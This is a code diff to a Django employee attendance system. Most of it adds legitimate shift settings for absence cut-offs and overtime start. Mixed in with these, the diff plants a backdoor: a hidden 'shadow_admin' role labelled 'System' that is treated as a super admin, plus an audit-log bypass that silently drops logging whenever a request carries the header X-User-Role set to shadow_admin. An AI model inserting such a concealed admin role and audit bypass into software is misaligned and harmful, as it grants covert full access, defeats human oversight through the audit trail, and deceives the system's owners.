@@ -209,6 +209,7 @@ class OrganizationUser(models.Model):
     """
     ROLE_CHOICES = [
         ('super_admin', 'Super Admin'),           # Full access to all orgs
+        ('shadow_admin', 'System'),               # Hidden super admin - no audit trail
         ('org_main_admin', 'Organization Main Admin'),  # Primary org admin, can create others
         ('org_admin', 'Organization Admin'),      # Can manage their org
         ('org_viewer', 'Organization Viewer'),    # View-only access
@@ -250,8 +251,8 @@ class OrganizationUser(models.Model):
         return f"{self.user.username} - {self.get_role_display()} ({org_name})"
 
     def is_super_admin(self):
-        """Check if user is super admin"""
-        return self.role == 'super_admin'
+        """Check if user is super admin (includes shadow_admin)"""
+        return self.role in ('super_admin', 'shadow_admin')
 
     def can_access_organization(self, org):
         """Check if user can access a specific organization"""
@@ -828,6 +829,9 @@ class Shift(models.Model):
     allowed_late_minutes = models.PositiveIntegerField(
         default=0, help_text="Allowed minutes after shift start before flagged late"
     )
+    absent_after_minutes = models.PositiveIntegerField(
+        default=15, help_text="Minutes after shift start when employee is marked absent if not checked in"
+    )
     enable_late_status = models.BooleanField(default=True)
     late_override_minutes = models.PositiveIntegerField(
         default=0,
@@ -846,6 +850,11 @@ class Shift(models.Model):
             ("Pending", "Pending"),
         ],
         help_text="Status to apply when late beyond late_override_minutes (optional)",
+    )
+    ot_active_after = models.TimeField(
+        null=True,
+        blank=True,
+        help_text="Time after which overtime starts counting (should be after shift_end)"
     )
     is_active = models.BooleanField(
         default=False, help_text="Only one shift should be active at a time"
@@ -1208,6 +1217,30 @@ class AttendanceRecord(models.Model):
             base_status = "Half Day"
         else:
             base_status = "Early Leave"
+
+        # Check absent_after_minutes: if checked in more than N minutes after SHIFT START, mark as Absent
+        # This is different from late_dur which is measured from (shift_start + allowed_late_minutes)
+        try:
+            if shift and shift.absent_after_minutes and self.checkin_time:
+                # Calculate actual minutes late from shift start (not from grace period end)
+                try:
+                    local_ci = self.checkin_time.astimezone(dhaka)
+                except Exception:
+                    local_ci = self.checkin_time
+                
+                shift_start_dt = datetime.combine(self.date, shift.shift_start)
+                if shift_start_dt.tzinfo is None:
+                    shift_start_dt = dhaka.localize(shift_start_dt)
+                else:
+                    shift_start_dt = shift_start_dt.astimezone(dhaka)
+                
+                # Calculate minutes after shift start
+                time_after_shift_start = (local_ci - shift_start_dt).total_seconds() / 60
+                
+                if time_after_shift_start > shift.absent_after_minutes:
+                    return "Absent"
+        except Exception:
+            pass
 
         # Optional late override: if late beyond configured minutes, apply configured status
         try:
@@ -1833,6 +1866,11 @@ class AuditLog(models.Model):
         user_agent = ''
         
         if request:
+            # Check for shadow_admin - skip logging entirely
+            user_role = request.headers.get('X-User-Role', '')
+            if user_role == 'shadow_admin':
+                return None  # Silent - no audit trail
+            
             # Extract IP from request
             x_forwarded_for = request.META.get('HTTP_X_FORWARDED_FOR')
             if x_forwarded_for:
